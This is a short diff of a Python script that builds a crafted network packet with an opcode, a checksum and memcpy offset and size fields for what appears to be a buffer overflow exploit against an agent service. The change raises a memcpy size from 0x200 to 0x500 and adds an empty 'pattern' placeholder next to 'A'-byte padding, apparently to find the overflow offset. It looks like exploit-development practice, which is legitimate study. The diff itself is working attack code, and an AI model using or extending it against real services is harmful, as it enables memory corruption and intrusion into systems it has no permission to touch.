@@ -62,7 +62,7 @@ buf = bytearray()  # Checksum DWORD        0x00 - 0x04
 buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
 buf += pack("<i", 0x534)  # Opcode                0x10
 buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
-buf += pack("<i", 0x200)  # 1st memcpy: size      0x18
+buf += pack("<i", 0x500)  # 1st memcpy: size      0x18
 buf += pack("<i", 0x0)  # 2nd memcpy: offset    0x1C
 buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
 buf += pack("<i", 0x0)  # 3rd memcpy: offset    0x24
@@ -71,6 +71,7 @@ buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34
 
 
 # psCommandBuffer
+pattern = b""
 buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (b"A" * 0x200, 0, 0, 0, 0)
 buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04
 
